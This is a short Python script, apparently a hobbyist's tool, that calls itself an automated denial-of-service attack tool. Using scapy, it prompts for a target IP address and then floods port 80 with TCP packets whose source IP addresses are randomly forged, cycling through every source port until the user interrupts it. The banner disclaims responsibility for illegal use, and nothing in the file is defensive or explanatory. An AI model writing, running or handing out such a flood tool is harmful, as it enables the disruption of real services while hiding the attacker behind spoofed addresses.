import random
from colorama import Fore, Back, Style
from scapy.all import *
print(Fore.GREEN +'''Starting program...
         This is an automated DOS attack tool created by O.Ntloyiya.
         if you are using this for illegal attacks , I am not responsible..
''')
target_IP = input("Enter IP address of Target: ")
i=1
try:  
    while True:
        a = str(random.randint(1,254))
        b = str(random.randint(1,254))
        c = str(random.randint(1,254))
        d = str(random.randint(1,254))
        dot = "."
        Source_ip = a+dot+b+dot+c+dot+d
        for source_port in range(1, 65535):
            IP1 = IP(src= Source_ip, dst=target_IP)
            TCP1 = TCP(sport=source_port, dport=80)
            pkt = IP1 / TCP1
            send(pkt,inter= .001)
            print (Fore.RED + "packet sent ", i)
            i = i + 1
except KeyboardInterrupt:
        print('\n' + "Program Interrupted!" + '\n' + Fore.GREEN + "Total packets sent ", i)